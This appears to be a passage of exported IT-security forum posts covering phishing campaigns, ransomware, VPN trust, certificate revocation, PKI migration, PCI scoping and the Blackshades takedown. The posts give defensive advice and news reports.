with it (PlugX, 9002 RAT 3102 variant, T9000, Grabber, Gh0st RAT LURK0 variant and perhaps others), profiled in previous ASERT threat intelligence products.",0

My expectation is that more people than ever before will look to convenient digital payment options such as Android Pay, Samsung Pay, Apple Pay, and even each store's own dedicated app -- but are they safe? The Parallax sought to answer this question.Experts say that digital payments can actually be safer, due to how the transactions are tokenized. Each transaction uses a one-time token, meaning that even if a hacker saw everything, they wouldn't be able to use it to cause further damage. In fact, Wendy Nather from Duo Security says: ""Keep your debit card at home."" She also recommends using well-known peer to peer payment apps as an alternative, e.g. PayPal, although they aren't quite as safe in her eyes as the aforementioned ""Pay"" apps.This is a bold statement, but a reminder of how far digital payments have evolved. Do you feel the same way? Will you be using digital payment this year? https://www.the-parallax.com/2017/11/10/secure-digitally-mobile-pay-holiday-shopping/",11

2083877,How A Single Hack Brought Down Hilary Clinton,"The team over at Ars Technica released last December detailed technical articles on the “Russians Hacking” during the US elections and a year later, much of it has been forgotten.There are a few choice dates in one of the articles which high-light how if a simple warning as heeded, the hack might have been prevented.The FBI warned the DNC of a potential ongoing breach of their network in November of 2015. Plenty of time to put in a plan and keep the bad guys out. This is good.But the first hard evidence of an attack detected by a non-government agency was a spear-phishing campaign being tracked by Dell SecureWorks. That campaign began to target the DNC, the Clinton campaign, and others in the middle of March 2016, and it ran through mid-April.Four months have passed since the FBI warning. The attackers start stirring up trouble. Well hopefully we can now deal with the issue,The DNC’s information technology team first alerted party officials that there was a potential security problem in late March, but the DNC didn’t bring in outside help until May.Whoops.They had another alarm bell raised and waited another 2 months? So that means in 6 months, they did not address the problem. Does that mean one of the following occured:Management knew about it but were ""too busy"" with an election?The FBI, Dell Security and in house IT were all ignored?Did the machine of bureaucracy turn too slowly to react?“But this attack used advanced technology. Nobody could have prevented it!”Wrong.All the 3 letter security agencies along with third party security researchers have stated quite clearly, that the breach was caused by a phishing campaign, which is the very old technique of tricking a victim into handing over something to the attacker through a bogus email, a bogus phone call, etc.This is not a new technique at all. It all comes down to the simple fact that whether it was a state government or a gang of criminals, the method relied on the oldest trick in the book, fooling people.People are the number 1 security riskThis is not news to anyone who has been in IT for more than 5 minutes. Here are three reasons why people are the security risk.When the movie “The Interview” the spoof about a certain nation in Asia was being released, Sony suffered a cyber-breach. Given the damage the breach caused, they would have surely improved their processes.Then this happenedA breached twitter account announcing the hoax death of Britney Spears. Was it a technical breach of Twitter or someone being careless at Sony? Most likely, Sony dropped the ball again.April 2015 a french media company TV5Monde suffered a huge breach, believed to be the work of extremist sympathisers at first, some have cited the Russian Government performing cyber tests of advanced weapons but there is a far simpler explanation...Post-it note on the wall revealing passwords during TV broadcastThe company has spent millions upon millions on security and protection software since the breach. Not to mention hugely disruptive policies yet if they just kept the post-it notes off the walls, would that have worked out cheaper and more effective?Despite huge media coverage, the easy tricks are working very well for the bad guys. When they do a bit of research on a company and target a scam email at that company, they usually get a result.Solving the problemSome organisations when they budget for security do one of the followingPay for security productsGet your team better at securityNine times out of ten, they pay for security products or services first because improving the team is a more difficult challenge, it is easier to put in a magic box that solves all the problems.We also have a culture of security companies who focus on selling these tools and promising that if you have the latest from brand X, you will be safe. Yet how do we knowPractical tips on what you should doThere is no point owning the most expensive firewall on the planet, if the IT department is not properly trained how to use it, what if you bought a cheaper firewall and spend the money you saved on training the IT team how to properly defend the business.When someone is caught stealing money, Should you ask the accountant who found the problem to discipline the employee. Why do we ask IT to play the role of sheriff when security rules are broken? Have clear rules and procedures in place and enforce them.If security is a concern, find a reputable company to test the defences. They might send fake emails and see who opens them, they can check the software to see if there is anything bad waiting.Anti-Virus alone is not enough. We have proven repeatedly with our clients that no matter which product you use. The success rate of preventing threats is dangerously low. You need layers of defences.Dismiss the illusion that you are too small a target.

2085303,New spear phishing technique nearly impossible to detect,"Hi all,Wanted to share details around a really interesting and dangerous attack Barkly blocked earlier this week. It utilizes a new technique that's just plain nasty.On Tuesday, users at one of our customer organizations began receiving emails from contacts they have at another organization. In the screenshot below you can see that at least one of the emails appeared to be a reply to an existing email thread, where users at the two organizations had been emailing back and forth.The new message was noticeably short — ""Morning, please see attached and confirm"" (you probably see where this is going) — but in the context of the email chain it was very convincing.  So the user opened the attachment (a Word doc), followed the instructions to enable macros, and... the Barkly pop-up appeared letting her know an attack had been stopped.Here's what was trying happen:The organization our customer organization had been emailing with had been infected with a new variant of Ursnif, one of the most active and widespread banking trojans in the world. In addition to packing the capability of stealing victim credentials in a variety of ways (via man-in-the-browser attacks, keylogging, screenshot capture, etc.) it now looks like Ursnif is taking its infections one step further and using the compromised email accounts of its victims to spread the infection further.Basically, it's turning victims into unsuspecting attackers. What makes this so dangerous is that the email pictured above wasn't just coming from an organization the recipient knew and had been emailing with, it came as a reply to an existing email chain. That is very hard for a user not to trust.Upon further investigation, we determined the Word doc the user downloaded contained a macro that, when activated, launched PowerShell script designed to download the Ursnif payload. Barkly blocks malicious scripts from being launched from Office documents, so this attack was blocked before the payload could even touch the system.What if attackers found another way of getting Ursnif on a machine? Just to be sure we tested and confirmed Barkly blocks the Ursnif executable file, too (so thanks to Barkly it actually wasn't that close of a call, after all).  Ursnif isn't the only trojan we've seen hijacking victim email accounts. In July, we saw the Emotet trojan doing something similar. If this is becoming a larger trend it puts even more emphasis on blocking attacks at the earliest stage possible, before they can start pumping out more attacks being delivered under your name. You can read more about the attack campaign here: https://blog.barkly.com/ursnif-banking-trojan-spear-phishing-attacksWhat do you think? How likely is it your users would fall for this clever attack?",0

2184495,The Dangers of Free VPNs,"Written by guest blogger, Josh Lake.If you use a free VPN, then you have to wonder how your provider earns money to cover their own costs. The answer often involves advertising, but it can also be through far more sinister means.Running a VPN service costs a significant amount of money. There are setup costs, infrastructure costs, labor and other running costs. The companies behind these services generally want to make a profit as well.Why are free VPNs a problem?It really depends on your use case, but in general, VPNs are used to enhance both the online privacy and security of those who use one. Privacy and security tend to involve trust, which becomes especially important when we consider VPNs.To understand this properly, we have to take a step back and examine how VPNs protect their users. The most common analogy is that a VPN provides an encrypted tunnel between the VPN client on a user’s device and the VPN server.This tunnel essentially means that no other party can see the connections and data you are transferring between your device and the exit server. Your ISP, the government and other snoopers will be able to see that you are sending encrypted data through a VPN, but they won’t be able to see what it is.If someone is examining the traffic between the exit server and the website you are visiting, they will be able to see that someone from the VPN’s server is connecting to the site, but they won’t know where the connection originates from.In this way, a VPN’s encrypted tunnel protects users and their information from outside parties like hackers and governments, and also allows users to get around geo-restrictions by making it seem like their connection is coming from another place.The point is that the VPN provider is the one that keeps you safe by letting you use their encrypted tunnel. Since all of your data goes through the provider, you need to find one that you can trust. If you can’t trust your provider, how can you know that your data is being kept secure and private?What can a VPN provider see?Technically, VPN providers have the capacity to see everything you do while connected. If it really wanted to, a VPN company could see what videos you watched, read emails you send, or monitor your search history.Thankfully, reputable providers don’t do this. A good provider shouldn’t take any logs of your activity, which means that although they could theoretically access your data, they discard it instead. These “no-log” companies don’t keep copies of your data, so even if they get subpoenaed by a government agency, they have no data that they can hand over.VPN providers may take different types of logs, so you need to be careful when reading the fine print of any potential provider. These logs can include your traffic, DNS requests, timestamps, bandwidth and IP address.It will depend on your use case, but if you want your VPN to provide the highest level of privacy, then you will want to choose one that records no logs at all.How do you know if a VPN provider keep logs?Most VPN providers will state on their websites whether or not they take logs, and if so, what kind. If the privacy policy doesn’t state the logging policy, or they make their logging process unclear, it’s best to assume the worst. No-log policies can be a huge selling point of many VPNs, so if a company doesn’t make their practice clear, it’s best to assume that they do keep logs in some form.How can you trust a VPN provider’s claims?At the end of the day, you can never really be 100 percent sure. The closest we can get is if a VPN provider was served a warrant or subpoena and was unable to give any data because they simply don’t have it. Even so, a provider may change their practices after a the court order has been carried out.While this may seem disheartening, the reality is that we don’t really need 100 percent confidence. For most situations, 99.99 percent is more than enough. You just need to find a VPN provider that you can trust enough for the activities that you intend to conduct over their service.There are a range of things that you will need to consider when evaluating whether a VPN provider is trustworthy enough for your intended uses. First, you will want to see that their website looks reputable.If everything checks out, you will want to go through their privacy policy and legal statements to ensure that everything is legitimate. Then you will want to do some...To continue reading, click here",0

2013843,Revocation is broken,"An interesting piece by Scott Helme on why certificate revocation is broken, and why it's a ticking time bomb.Full article, with lots of diagrams here: https://scotthelme.co.uk/revocation-is-broken/ Curious as to whether anyone has any opinions on this? Revocation is brokenWe have a little problem on the web right now and I can only see this becoming a larger concern as time goes by. More and more sites are obtaining certificates, vitally important documents that we need to deploy HTTPS, but we have no way of protecting ourselves when things go wrong.--- --- --- ConclusionAs it currently stands there is a real problem, we can't revoke certificates if someone obtains our private key. Just imagine how that will play out the next time Heartbleed comes along! One thing that you can do to try and limit the impact of a compromise is to reduce the validity period of certificates you obtain. Instead of three years go for one year or even less. Let's Encrypt only issue certificates that are valid for ninety days! With a reduced lifetime on your certificate you have less of a problem if you're compromised because an attacker has less time to abuse the certificate before it expires. Beyond this, there's very little we can do.To demonstrate the issue and just how real this is, try and visit the new subdomain I setup on my site, revoked.scotthelme.co.uk. As you can probably guess this subdomain is using a revoked certificate and there's a good chance that it will load just fine. If it doesn't, if you do get a warning about the certificate having expired, then your browser is still doing an OCSP check and you just told the CA you were going to my site. To prove that this soft fail check is pointless you can add a hosts entry for ocsp.int-x3.letsencrypt.org to resolve to 127.0.0.1 or block it via some other means and then try the same thing again. This time the page will load just fine because the revocation check will fail and the browser will continue loading the page. Some use that is...The final point I want to close on is a question, and it's this. Should we fix revocation? That's a story for another day though!",0

130866,New PKI - just need some advice,"So,I started this AD2008 months ago and would like to thank all those who has given me help in the past. I am on the last few steps in getting a DC decommissioned. What I have learned is not too put so many roles on a DC and is makes it very difficult to manage...at least for someone like me. Anyhow, the last two pieces are PKI and IAS. After reading on PKI, I decided to build a parallel PKI and transition over to it.Currently we have anOffline Root CA (2003) that is part of the domain----the new Offline Root CA will be server 2008 R2 and NOT part of the domain.2 Suborinate CAs which happen to be on our two Domain Controllers..One of which I am trying to decommission..----the two new Subordinate CAs will not be on domain controllers but rather dedicated servers (VMs) Here are some of my quesitons on the new PKI -1. the new offline root CA..standard or enterprise?2. Would two subordinate CAs be overkill? (Loosing at the services now, I see templates for DC Authentication, DC, Web Server, IAS, CA Exchange, Directory Email Replication, and Computer certificates being issues and issued. As a matter of fact, a lot of the certificates looks like it has expired already..(can I delete them?)It's odd because it looks like all the computer certificates are being issued by one of the CAs, the other only issued one computer certificate. and the rest were DC, DC authenticaton, etc....Is there anything you guys suggest I look at?3. Can the subordinate CA be part of the domain?4. Do the subordinate CA need to be on dedicated servers?5. Going back to IAS....since it is being issued a certificate...should I get PKI going first and then move IAS over?6. Can IAS be on a DC or does it need to be on a dedicated server?I know these are a lot of questions but if I screw this up...our public safety officers will not be able to connect to Netmotion (mobile VPN), vendors cannot VPN in to work on issues, and our internal wireless will go kaput.I want to be as thorough as possible.

400391,CryptoLocker Files Restored,"I have no explanation for this, but I was able to restore some of my Cryptolocker encrypted files.  Here's what happened.  We have a shared folder on our SQL server that holds Word documents generated by our main database application.  The folder is mapped by all clients.  One client was infected by Cryptolocker and I immediately started getting calls from people saying their documents looked like gibberish.  So I RDed into the client and disconnected the mapped drive letter, renamed the folder containing the encrypted documents and did a successful restore job from BackupExec. Unfortunately, the backup server had a glitch the night before and did not run so we were missing about a days worth of files, not to mention everything that had been created that morning.Meanwhile I ran Malwarebytes on the computer and removed all traces of Cryptolocker..  If there had been a list of encrypted files in the registry it was gone now.A week later things quieted down and I moved the old folder over to my Windows 7 workstation. Then I opened up one of the Word documents from a subfolder  just out of curiosity.  Surprisingly, it opened.  So I opened another and another.  It turned out all the files in that subfolder had not been encrypted. Maybe I had disconnected the mapped drive letter in time to prevent any further encryption. Forty-five files remained that were still encrypted.Today I thought they had been mysteriously unencrypted but I was mistaken.  Unfortunately without the file list there's no way to get them back. ",11

2103106,"Efficiency and security, adding domain(s), mac filtering, and/or Radius","I'm looking to tighten down on local security in our infrastructure.  We currently have Fortigate's which do good for anti-virus, URL, and other filtering in regards to internet traffic.  However we're on a workgroup and use static IP's.  I've been throwing around a few ideas in regards to improving efficiency and security.I'd like to add that we have 5 sites, each with their won internet connection.  They are connected through a fiber M.A.N.  To connect the devices we have small business switches with VLAN security.  My main problem is adding the most essential while keeping cost to a minimum.  I'm considering the three options below, and would like some feedback as to how useful they would be and the environment setup we would need to implement each.  1. Adding a local domain. I know this adds some efficiency with a real group policy, print servers, and WSUS.  I don't know much in regards to how a domain might help with security.  Please elaborate on the hardware/software requirements and benefits of a local domain?2. Adding Radius or other hardware based security. I've read about Radius and other hardware based authentication, but honestly don't know a lot about actually implementing it or setup pre-requisites.  I'd like some input as to the different hardware authentications technologies available, pros and cons, and hardware/software requirements (how many servers etc).3. Implementing Fortigate and maybe switch MAC filtering. This is probably the cheapest and least useful of the 3 mentioned.  We already have the router/firewalls and switches.  Possible benefits include turning on DHCP and restricting unknown devices from network connection depending on how we implement this setup.  It would be a little tedious every time we need to switch out a device, but would prevent most people from attempting to connect without at least using MAC spoofing. My main question here, is this method of layer 2 MAC filtering worth the extra time it would consume for the security benefit?  Using static IP's most end users don't know how to connect as is.  Those with the knowledge to add a static IP, if they were malicious, would probably know how to spoof a MAC address.  So is this even worth it?",0

2144157,"Social Media Malware is Deviant, Destructive","We’ve seen some tricky techniques by cybercriminals when it comes to distributing malware through social media. The scam start from an already compromised Facebook account belonging to one of your friends where a message is sent with an attached SVG image. (The SVG extention is an XML-based vector image format for two-dimensional graphics with support for interactivity and animation.)Cybercriminals prefer this XML-based image as it allows dynamic content. This enables the criminals to add malicious JavaScript code right inside the photo itself—in this case, linking to an external site. Users who click on the image find themselves on a website posing as YouTube that pushes a popup to install a browser extension or add-on or to view a video. There are plenty of red flags here like the URL clearly not being YouTube.com, as well as the fact that YouTube does not require any extensions to view videos.Worm-like propagationIf a you were to install this extension, it will take advantage of your browser access to your Facebook account to secretly mass-message your friends with the same SVG image file—like a worm, this is how it spreads. Victims don’t need to have very many friends for this tactic to be successful at propagating. For instance, if you have over 100 friends, then you only need less than 1% of your friends to fall for this for the scam for it to continue to propagate.To make matters worse, the extension also downloads Nemucod, a generic malware downloader generally used to download and install a variety of other threats. Usually the go-to threat is ransomware given it’s proven business model for criminals.Social media managers at riskThose who manage social media accounts on behalf of businesses are particularly at risk of advanced malware and other cyberattacks. Earlier this spring, a new Windows trojan dubbed Stresspaint was found hidden inside a fake stress-relief app and likely spread through email and Facebook spam campaigns to infect 35,000 users, according to researchers at Radware who discovered the malware.Stresspaint was rather deviant in the way it stole Facebook account credentials and logged into accounts looking specifically for data such as “each user’s number of friends, whether the account manages a Facebook Page or not, and if the account has a payment method saved in its settings,” according to Bleeping Computer.Allowing cybercriminals to gain control of brand social media accounts can carry grave consequences such as reputation damage, loss of confidential information, and deeper access into an organization’s network. Last year, HBO was humiliated on their social profiles when the notorious hacker group OurMine breached several the network’s accounts and posted messages before the company finally regained control of their logins.Crypto users targetedFollowing the recent trend in malware, sophisticated variants of existing strains are now aimed at cryptocurrency users. A malicious Google Chrome extension called FacexWorm, which spreads through Facebook Messenger, was found to have morphed with a new ability to hijack cryptocurrency transactions made on a host of popular online exchanges, according to Coindesk. This further underlines the importance of exercising caution with the information you share on social media to avoid being a target, particularly if you are a user of cryptocurrency.Cryptocurrency scams are another common threat that spreads throughout social media. Twitter is particularly notorious an outbreak of crypto scam bots that pose as high-profile tech leaders and industry influencers. Learn more about this type scam in my previous post.Don’t let your guard downGiven the nature of social networks, many are likely to consider themselves to be in the company of friends on sites like Facebook, Instagram and Twitter. However, this assumption can be dangerous when you begin to trust links on social sites more than you would in your email inbox or other websites. For instance, a simple bot-spam message on Twitter was able to grant a hacker access to a Pentagon official’s computer, according to a New York Times report published last year.It’s wise to be wary of clicking on all links, even those sent by friends, family or professional connections, as compromised social media accounts are often used to spread scams, phishing, and other types of cyberattacks. After all, just one wrong click can lead to an avalanche of cyber woes, such as identity theft, data loss, and damaged devices.Have you encountered malware or other threats on social media?",0

1975716,Remote removal of SEP client,"I have been looking for a solution to remotely remove theSEP client and I couldn't seem to find an easy solution but I think I createdone earlier that has worked on a couple of systems so far. I used SEPprep from the install media to uninstall anyexisting AV already on the system, including the Symantec endpoint client.  You'll have to read the PDF that comes withSEPprep to edit the ini but I had to make very few changes for ourenvironment.  I also usedClientRemote.exe to push out SEPprep.  Ihave been using ClientRemote to do all my installs since upgrading to 12.1.6MP3 and it is located on the SEPM server at this location. C:\Program Files(x86)\Symantec\Symantec Endpoint Protection Manager\tomcat\bin What I did was copy the SEPprep folder to where ourdeployment folders are located on the SEPM server.  Go in to the SEPprep folder and rename theSEPprep.exe or SEPprep64.exe to setup.exe then edit the ini to run silently andnot prompt to remove.  After this I ranClientRemote.exe and pointed to the renamed setup.exe (SEPprep64.exe) andpushed it out to our clients. It is very fast and once rebooted our new AVinstalled without any issue. Interested to hear thoughts on this or if you run in to anyproblems.",0

1969602,Report: 85% of Ransomware Victims Get Taken Offline For A Week or More,"New research reveals that the majority of ransomware victims (85 percent) had their systems taken offline for at least a week, costing businesses thousands in financial damage each day.It only takes seconds for ransomware to block access to an entire network, but the vast majority of businesses remain locked out of crucial files and systems for a week or more.Despite the risk of data loss and financial damages, the report produced by Timico and Datto found that organizations still lack awareness and readiness when it comes to responding to ransomware attacks.The survey entitled ‘The Reality of Ransomware’ polled 1,000 UK-based organizations made up of 500 SMEs and 500 large corporations – many of whom had been attacked within the last 12 months. Well over half of respondents said their data systems went from fully functional to essentially useless within seconds and minutes, the report noted.Of those infected, a third also said they went without their data for more than a month. Meanwhile, 15 percent reported their data was ultimately ‘unrecoverable.’  Nearly a quarter (23 percent) of respondents paid over £5,000 to retrieve their data, and 26 percent paid between £3,000 – £5,000“Higher ransomware fees in large corporations were reported, with a third of corporate businesses paying over £5,000 to recover data compared to just half that number of SMEs (15%),” read the report.In addition to the ransom fee paid to cybercriminals, more than half (53 percent) of respondents estimated that it cost the business between £1,000 and £2,000 per day in lost revenue.However, perhaps the most alarming statistic involves the fact that a staggering 63 percent of UK businesses still have no official ransomware policy in place to guide staff when responding to an attack.

2116540,Question about whether or not our network should be in scope.,So I am working on getting our small business up and running with PCI Compliance. The way our system is configured is we run an Amazon EC2 instance that handles our order placement and passes off the data to paypal gateway for payment processing. I am currently working on getting that EC2 instance compliant but my question is about our main office. We do not store any card holder data digitally in our office and all orders are entered via a web page on the EC2 instance. It is SSL secure and access to the EC2 is limited to our internal network only via HTTPS only. Email is handled by Google GSuite and is obviously offsite. We do have paper cardholder data that is used for recurring payments which is always filed and secured by lock and key. Would the primary office be in scope for the PCI compliant scan? We are using trustwave scanner and if it's out of scope I'd like to remove it from the scan all together. Thanks!,0

2053289,Hurricane Scams Continue to Make Landfall,"BY DAVID PICKETTA little over two weeks ago we posted about the first Hurricane Harvey scam emails that appeared in our spam traps.  The hurricane scams continue to persist without showing any signs of slowing down soon.Scammers are now using Harvey and Irma references or just a generic email to encompass any hurricane assistance efforts.We want to quickly remind everyone to be extremely careful where your donations go while re-emphasizing our safety tips. A few additional examples of a hurricane scam email and donation site are below.  The site was removed shortly after this screenshot was taken. At AppRiver, our SecureTide spam and virus filtering team works 24/7/365 to block these scams.Donation & Safety TipsNavigate directly to the legitimate sites or charities you may consider donating to. Type in the address manually instead of clicking links.If you aren’t sure about a charity, research them first using a third-party watchdog (give.org, charitywatch.org, guidestar.org, or charitynavigator.org).Be extremely suspicious of any attachment or link you may receive via email. Contact the sender directly if there is any question.If you are an AppRiver customer we will happily investigate any suspicious messages or attachments further for you, please contact us.Utilize checks and credit cards for donations directly to the charity itself, not an individual and avoid cash if possible. This creates a paper trail for tax deductions as well.Do not give out personal information such as drivers license information, social security number, birth dates, mother’s maiden name, etc.  This information is used by the bad guys for social engineering their way further into your accounts or ID theft.Hurricane Scams Email & Website Examples ",1

1531623,"How to defend myself against ""hacking"" accusations at work?","A little context about myself to start: I recently started working for a small state university about six months ago. I'm one of four technicians and the operations staff is less than ten people. As far I know, I am the only Cisco-certified employee (CCENT, nothing advanced). I've had the cert for a while, but have never been in a position to actually use any of the knowledge, and have retained little. I do have several pieces of Cisco gear at my desk. I have asked our network engineer about mentorship opportunities in the past, but he is very defensive and has always put me off. In my previous job, I was responsible for physical security audits, and learned basic lockpicking in the process.Anyways...This week, my coworkers have been making comments that there are rumors that I am suspected of ""hacking"" one of the switches in the IDF nearest to the technicians' area. The IDF is locked and I do not have access. Our helpdesk was recently moved to this new building, and during the move, the IDF door was regularly left unlocked or even left open. I have only ever been into the IDF when the network engineer was with me on one occasion for just a few minutes. We do have networking consultants on campus occasionally. I have never attempted to pick any doors at this current job, and I can tell by the key and model of lock that picking it is beyond my capabilities.I didn't think much of the rumors until this morning. The network engineer came into the technicians' area and spoke exclusively with the lead tech regarding the issue. However, he made sure to speak loud enough that I could hear across the room. Numerous accusations were made alluding that I created some account on the switch and tried to set up some sort of remote access ability. He emphasized that it was done at a very basic level, using default account names that would be used in Cisco training, and that he knows one of the techs had an entry-level Cisco certification. He claimed that this ""intrusion"" will now require a new switch and three months of work to mitigate and he is taking it to the IT director. He left without ever saying a word to me directly. He and I are generally friendly and it's common for us to stop in the hallways and talk shop for 20+﻿ minutes.I took the initiative to speak with my manager, who says not to worry about it. The network engineer does have a reputation of being a little off-kilter that everyone is aware of. My manager said the engineer likely made a mistake and is trying to avoid taking responsibility. Apparently, it's not uncommon for him to do this.What can I do to defend myself in the event of a confrontation or investigation? Any evidence does point directly to me being the most likely, but I have no interest in messing with the production network (that's why I have a test lab at my desk!).Thanks in advance.",0

As stated by Jakub -- Avast detects all WannaCry components -- including the variants with the worm component, as well as those that simply encrypt files.If you read anything about WannaCry, I strongly suggest this.

1173373,Separate 3rd Party Vendor Located in Our Offices,"﻿Thanks in advance.We recently formed a partnership with another company, and one of their employees has setup shop at our location.  They need access to our core system for customer information, but the vendor also needs access to the 3rd party's email system, cloud storage, online meeting site, etc... that we don't allow our employees to access.Right now we just have a separate GPO and web filtering policy for him.  A government examiner recently came in and reminded us to keep them as separated as possible from our core network.  We were comfortable with that setup until they started requesting software, sites, and permissions that made us feel uncomfortable (a couple of cloud based file shares, chat, remote access for their IT, etc...).  The user doesn't seem to be particularly adept with computers, and our fear is either 1) he'll do something to cause a compromise or 2) his company will cause something to cause a compromise.﻿Right now our solution is to setup 2 PCs for him; one will be managed by us and be locked down similar to our other users.  The other pc will be on our other network (separate ISP).  He'll have a KVM so he can switch back and forth between the 2 PCs.Does anyone have a better, more clever way to accomplish separating their needs from our network?  We thought about just throwing him on the DMZ, but we keep coming back to using 2 PCs as a more secure choice.﻿",0

133561,Issues with HTTPS sites through ISA server,Presently we run ISA server 2006 and Surfcontrol it apply browsing restrictions. Recently (I have no doubt ties in with a GPO corruption) we have had issues with the way the users browser passes info onto the ISA box. The fire wall policies only allow authenticated users through as that user info is then passed on to SurfControl for the logging and restriction. We have started to note that when a user hits a secure site the browser is no longer passing on the username and so the ISa server policy blocks it as it is not from an authenticated user. We have had to allow all SSL traffic trhough for all users and also open up the SurfControl restrictions as well. This just isn't good enough as it is hard to problem solve some connection issues. What I need to know is why the username is not being passed through on a SSL connection and how to change that so the connection can be authenticated again. I am properly stumped on this one and it is causing so real issues as a lot of our business broweing is SSL based. Any guidance will be greatly appreciated.,0

The Gateway has a x.x.x.54 public ip and the Netgear has x.x.x.53. I have a /29 network. The business mx record is also x.x.x.53 and i have port forwarding to the mail server.      I have worked with both Netgear and Comcast for the last two days. Comcast is saying that the modem is set up in a bridge mode and should be passing all traffic unfettered. Netgear is saying that IKE phase 1 is not working and that the Gateway is blocking the connection. Netgear is wanting to try putting the firewall on DHCP from the modem with a private ip and then put that ip in the DMZ. My reservation is that i believe i need to have the public x.x.x.53 on the firewall to keep email flowing.      Should i put the public .53 on the mailserver second nic and then put it in the dmz? Any suggestions? Or should I demand Comcast put in a tru bridge modem? ,0

497950,Blackshades – a Coordinated Takedown Leads to Multiple Arrests,"Wow...this is pretty awesome.  Symantec worked with international law enforcement including the FBI & Interpol among others to bring down the bad guys selling Blackshades RAT malware.  Dig it:Blackshades – a Coordinated Takedown Leads to Multiple Arrests﻿The FBI, Europol and several other law enforcement agencies have arrested dozens of individuals suspected of cybercriminal activity centered around the malware known as Blackshades (a.k.a. W32.Shadesrat). Symantec worked closely with the FBI in this coordinated takedown effort, sharing information that allowed the agency to track down those suspected of involvement. As a result of this operation, the website selling Blackshades has been taken down and we expect a significant reduction in activity involving this malware. Blackshades is a popular and powerful remote access Trojan (RAT) that is used by a wide spectrum of threat actors, from entry level hackers right up to sophisticated cybercriminal groups. Blackshades was sold on a dedicated website, bshades.eu for US$40-$50. Competitively priced, with a rich feature list, Blackshades provides the attacker with complete control over an infected machine. A simple point and click interface allows them to steal data, browse the file system, take screenshots, record video, and interact with instant messaging applications and social networks. Figure 1. The Blackshades command-and-control panelThe arrests come just days after the FBI announced that it would take a more aggressive stance against cybercriminals who target American citizens, promising imminent searches, arrests and indictments. Figure 2. Computers infected with Blackshades (2013 – 2014)Figure 3. Top 10 countries affected by Blackshades activity (2013 – 2014)As part of the sting operation, the source of this RAT – bshades.eu – has been taken offline. This will seriously affect the sale and distribution of Blackshades. Symantec expects there to be a significant decrease in activity for Blackshades in 2014. Although cracked builders and the source code for Blackshades remains online on various forums, we expect cybercriminals will begin to adopt other Trojans.  This was not the first law enforcement action taken against Blackshades. In 2012, the FBI arrested Michael Hogue (a.k.a. xVisceral) on suspicion of involvement in the Blackshades project along with over 20 other individuals. However, the malware remained on sale and Blackshades continued to see increased activity in 2013.Organized cybercriminal groups have netted millions of euro in well-organized attacks, transferring large sums of money using Blackshades infected computers. In a recent operation dubbed Francophone, Blackshades was used as part of a sophisticated social engineering scheme to target French companies in financially motivated attacks. Total financial losses involving Blackshades activity would be hard to accurately gauge, however individual cases indicate they are significant. Blackshades was also observed in politically motivated attacks during The Arab Spring. Political activists were targeted in Libya and Syria during the uprisings with one variant Blackshades (W32.Shadesrat.C).Symantec welcomes the action taken by the FBI and remains committed to working with law enforcement and private industry partners in the effort to tackle these increasingly sophisticated cybercriminal operations.Protection Symantec protects users against Blackshades under the following detection names.Antivirus detectionsW32.ShadesratW32.Shadesrat.BW32.Shadesrat.CIntrusion Prevention SignaturesSystem Infected: W32.Shadesrat 2System Infected: W32.Shadesrat ActivitySystem Infected: W32.Shadesrat Activity 2System Infected: W32.Shadesrat Activity 3If you believe you may be infected with Blackshades and are not a Symantec customer, you can use our free tool Norton Power Eraser to remove it from your system.﻿﻿We're going to be seeing more about this soon, so stick around...",12
124238,Is this virus really unknown?,"I had the unfortunate incident of getting a virus on one of our production machines. I replaced CA with Trend Micro, and TM immediately detected a virus it called TROJ_GEN.R47C3A7. The virus was detected in MS.DLL... I was able to see that it was not a false positive by running TCPview. Trend Micro could not clean or delete the file, and Malware Bytes and Spybot S&D couldn't even detect it. I ended up using File Assassin to get rid of the file, knowing that it may hose the OS (which it did). After running an operating system repair, everything returned to normal, and it was no longer detected by TM, and tcpview was clean. The thing that really bugs me is that researching the virus name, and the DLL revealed nothing helpful, except  a couple generic things about ms.dll likely being a virus. Unfortunately I got in such a hurry to fix it, I didn't record the sites it called out to in tcpview. I like to learn exactly what a particular virus does so that I can learn what potential exposure we had as a result but I find nothing on this. Anyone else seen this?",0

1181427,AlienVault USM:  Anyone using it?  PCI reporting?  Argh!,"This is specifically for any AlienVault users.I'm getting really frustrated with this product, especially after spending big bucks on it.

(Centralized logging server)10.2.3: Provide an excerpt (20 lines) from an audit trail which demonstrates that all access to log files is recorded. (Centralized logging server)10.2.6:  Provide an excerpt (20 lines) from an audit trail which demonstrates that logging service initialization is recorded. (Centralized logging server)10.2.7:  Provide an excerpt (20 lines) from an audit trail which demonstrates that system level access is recorded (e.g. mounting a new disk, start/stopping services, etc.) (Centralized logging server)We are a Windows shop.One of the problems is that while the HIDS agent states it's send the system, application and security logs, it seems that SIEM events are only being created from the security event logs.  And for the life of me, I cannot figure out why.  I've been told that this is all covered under msauth_rules.xml... but I see NO events from the application or system logs.  I know I could show that the event log service starting from the system event logs and satisfy 10.2.6.  Every time you reboot a server, the ""event log service is started"" message shows up in the system event logs.  And I should see that in SIEM events.Another issue:  USM reports.  I was hoping that the USM report ""PCI DSS 3.0: Admin Access to Systems"" could be run and satisfy 10.2.2.  But the report shows nothing.  Checking on the report, it's supposed to be getting its data from the ""PCI-Protect Stored Data-Administrative access to Systems"" module.   Which, shows nothing.  Do I need to reference and/or define any specific Data Source group to make this work?OK, so let's say I DO need to create a Data Source group to make the ""PCI-Protect Stored Data-Administrative access to Systems"" module work.  OK, there's no data source for administrator level logins.  Do I now have to write a freakin' data source?Checking the Compliance Mapping in Threat Intelligence:  That looks hopeful!  Taking a look, I see the four PCI items I need to report on.  Great!  Let's look at section 10.2.7 ""Creation and deletion of system level object"".  Awesome!  Wait- there's no data source listed in that Compliance mapping rule.  And there's no available directive event that would work.  WTF?Could I be missing the right plugins?

If I'm the very first person to ever have these issues- then great, that means people might have the answer.  I admit I'm new to SIEM.  I cannot believe that nobody can answer my questions about seeing specific Windows system event log items, like a disk being added or removed, or the event log service starting.

Overall ransomware levels remained high through March 2014, and then slowly started to decline, in part due to the disruption of the GameOver Zeus botnet back in late May.In contrast, crypto-style ransomware has seen a 700 percent-plus increase. These file-encrypting versions of ransomware began the year comprising 1.2 percent of all ransomware detec­tions, but now make up 31 percent at the end of August. One variant known as CryptoDefense began to appear in large numbers in early June. By the end of July, it made up 77 percent of all crypto-style ransomware for the year to date. This is a pretty staggering uptrend, which only points out that you really, really need to step end-users through effective security awareness training.﻿",0
